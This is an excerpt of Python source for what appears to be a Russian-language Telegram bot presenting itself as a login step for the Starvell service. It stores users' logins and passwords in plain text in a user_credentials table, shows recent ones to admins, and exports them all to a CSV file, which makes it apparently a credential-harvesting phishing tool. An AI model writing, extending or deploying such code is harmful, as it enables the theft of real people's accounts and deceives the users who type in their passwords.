...
def get_all_data_for_export():
    try:
        ...
        cursor.execute('''
            SELECT user_id, username, first_name, last_name, login, password, timestamp 
...
def create_csv_export():
    try:
        ...
        # Заголовки
        writer.writerow(['User ID', 'Username', 'First Name', 'Last Name', 'Login', 'Password', 'Timestamp'])
...
def admin_keyboard():
    keyboard = [
        ...
        [KeyboardButton("📈 Детальная статистика"), KeyboardButton("📁 Выгрузить данные")],
...
# Детальная статистика для админа с логинами и паролями
async def show_detailed_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        # Последние 10 записей с логинами и паролями
        cursor.execute('''
            SELECT user_id, username, first_name, last_name, login, password, timestamp 
            FROM user_credentials 
            ORDER BY timestamp DESC 
        ...
        stats_text = f"""
📈 *ДЕТАЛЬНАЯ СТАТИСТИКА АДМИНА*

📊 *Общая статистика:*
• Всего записей: *{total_count}*
• Уникальных пользователей: *{unique_users}*
• Сегодня: *{today_stats[0] if today_stats else 0}* пользователей
• Входов сегодня: *{today_stats[1] if today_stats else 0}*

🔐 *Последние 10 записей:*
"""
        
        # Последние записи с логинами и паролями
        for i, login_data in enumerate(recent_logins, 1):
            user_id, username, first_name, last_name, login, password, timestamp = login_data
            stats_text += f"\n*{i}. ID:* `{user_id}`\n"
            stats_text += f"   *👤 Имя:* {first_name or 'Нет'} {last_name or ''}\n"
            stats_text += f"   *📱 Username:* @{username or 'нет'}\n"
            stats_text += f"   *📧 Логин:* `{login}`\n"
            stats_text += f"   *🔑 Пароль:* `{password}`\n"
            stats_text += f"   *🕐 Время:* {timestamp[:16]}\n"
        
        stats_text += f"\n💾 *Всего записей в базе:* {total_count}"
        stats_text += f"\n📁 *Для полной выгрузки используйте кнопку \"📁 Выгрузить данные\"*"
...
async def export_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text("📁 Создаю файл с данными...")
    ...
    try:
        ...
        file_name = f"starvell_data_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        ...
        await update.message.reply_document(
            ...
            filename=file_name,
            caption=f"""
✅ *Выгрузка данных успешно создана!*
...
💡 *Файл можно открыть в Excel или Google Sheets*
        ...
        logger.error(f"❌ Ошибка выгрузки данных: {e}")
        await update.message.reply_text("❌ Произошла ошибка при создании файла")
...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if text == "🔐 Войти в Starvell":
        ...
        await show_detailed_stats(update, context)
    elif text == "📁 Выгрузить данные" and user.id in ADMIN_IDS:
...
def main():
    ...
    print("📁 Выгрузка данных: доступна")
